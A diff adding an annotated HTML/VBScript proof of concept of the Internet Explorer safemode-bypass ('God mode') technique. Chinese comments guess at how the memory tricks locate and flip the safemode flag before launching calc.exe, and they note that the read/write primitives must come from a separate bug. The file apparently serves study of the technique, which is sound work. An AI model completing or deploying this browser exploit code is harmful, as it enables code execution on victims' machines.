@@ -1,0 +1,78 @@
+<script>
+/**
+	目前没搞懂的地方有两处：
+	1. myarray 究竟有什么作用（也是 yuange 提出的问题）
+		不靠谱猜测，
+			有了这个 document.write 写，
+			即可完成下面的 NtSystemRoot 地址的定位。
+	2. 后续代码 sub testaa() 和 
+		function mydata() 
+		究竟在利用中会起到什么作用 
+		不靠谱猜测，
+			也是为了搜索safemode 的作用，它可以对内存做一些可控的部署，
+			进而暴露出  0x7ffe0030 的作用？
+*/
+</script>
+<SCRIPT LANGUAGE="VBScript">
+myarray= chrw(01)&chrw(2176)&chrw(01)&chrw(00)&chrw(00)&chrw(00)&chrw(00)&chrw(00)
+	//   0x0001    0x0880     0x0001  0x0000   0x0000   0x0000   0x0000   0x0000
+myarray= myarray&chrw(00)&chrw(32767)&chrw(00)&chrw(0)
+	//           0x0000    0x7fff     0x0000   0x0000
+document.write(vartype(myarray))
+document.write(vartype(myarray(&h7ffe0030)))
+    //  0x7ffe0030 这个地址在TK的热起利用中有过介绍，
+    //  是一个指向  unicode 字符串"C:\WINDOWS" 的地址
+    //  含义为 NtSystemRoot
+</script>
+
+<script>
+/**
+	起初这里应该是一些基本加载定位的问题，
+	为的是后面能够准确遍历出 safemode 位置
+	
+	具体原因不明，仅是不靠谱猜测。
+*/
+
+sub testaa()
+end sub
+
+function mydata()
+	On Error Resume Next
+	i = testaa
+	i = null
+	ab(0) = 0 
+	aa(a1) = i
+	ab(0) = 3
+	mydata = aa(a1)
+end function
+
+/**
+	下面就是搜索safemode 的位置， 当搜到 0xe 时，将其修改为开模式
+	具体原理可参考古河放过的大招（Exploit IE Using Scriptable ActiveX Controls.pdf）。
+
+	要成功试用这个POC 需要根据漏洞自实现  readmem 和 writemem两个函数
+		即将漏洞转化为 任意地址 可读，可写。
+
+	这也证明 任意地址可读写就是漏洞可利用的等价条件。
+*/
+function setnotsafemode()
+	On Error Resume Next
+	i = mydata()
+	i = readmem(i+8)
+	i = readmem(i+16)
+	j = readmem(i+&h134)
+	for k = 0 to &h60 step 4
+		j = readmem(i + &h120 + k)
+		if(j = 14) then
+			writemem(i + &h120 + k)
+			Exit for
+		end if
+		next
+	end function
+
+function runcalc()
+	On Error Resume Next
+	set sh = createobject("Shell.Application")
+	sh.ShellExecute "calc.exe"
+end function
+</script>
